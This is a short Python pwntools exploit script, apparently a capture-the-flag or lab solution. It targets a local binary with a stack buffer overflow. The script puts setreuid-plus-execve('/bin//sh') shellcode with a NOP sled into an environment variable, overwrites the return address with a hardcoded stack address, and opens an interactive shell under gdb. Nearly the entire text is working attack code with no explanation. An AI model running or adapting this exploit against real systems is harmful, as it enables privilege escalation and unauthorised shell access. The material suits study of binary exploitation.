#!/usr/bin/env python
#0xffffdfb0

from pwn import *
import os

env = {
        'shellcode' : "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80",
}

context.terminal = ["tmux", "splitw", "-h"]
p = process('./stack-ovfl-use-envp-xx', env=env)
gdb.attach(p)

buf = "A" * 0x10 + p32(0xffffdfb0)

p.sendline(buf)
p.interactive()
